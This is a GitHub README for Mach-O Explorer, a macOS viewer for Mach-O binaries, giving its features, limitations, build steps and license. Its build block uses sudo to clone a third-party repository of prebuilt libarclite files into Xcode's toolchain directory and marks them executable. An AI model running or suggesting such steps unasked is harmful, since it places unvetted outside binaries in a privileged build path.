<p align="center">
    <img width="850" height="171" src="https://raw.githubusercontent.com/DeVaukz/MachO-Explorer/master/.github/banner.png">
</p>

Mach-O Explorer is a graphical Mach-O viewer for macOS.  It aims to provide an interface and feature set that are similar to the venerable [MachOView](http://sourceforge.net/projects/machoview/) application.  Parsing is handled by Mach-O Kit.  Mach-O Explorer leverages Mach-O Kit's rich description system to present the parsed data using very little code.

![Screenshot](https://raw.githubusercontent.com/DeVaukz/MachO-Explorer/master/.github/hero.png)

Mach-O Explorer should deploy back to OS X 10.11 (and possibly further) but is *currently* only being actively tested on macOS 10.14.

### Limitations

* Mach-O Explorer does not include a disassembler.  This may be added in the future.
* Mach-O Explorer can not attach to a running process to analyze its headers.  This may be added in the future once support in Mach-O Kit improves.
* Mach-O Explorer does not support editing Mach-O files and there are no plans to add this feature.

## Getting Started

### Requirements

* Xcode 11.0 or later to build

### Compiling

***Use a recursive git clone***.

```
git clone --recursive https://github.com/DeVaukz/MachO-Explorer


cd /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/

sudo mkdir arc
cd  arc
sudo git clone https://github.com/kamyarelyasi/Libarclite-Files.git .

sudo chmod +x *


```

Open the `MachOExplorer.xcodeproj` file, select the `MachOExplorer` target and click Run.

## License

Mach-O Explorer is released under the MIT license. See
[LICENSE.md](https://github.com/DeVaukz/MachO-Explorer/blob/master/LICENSE).
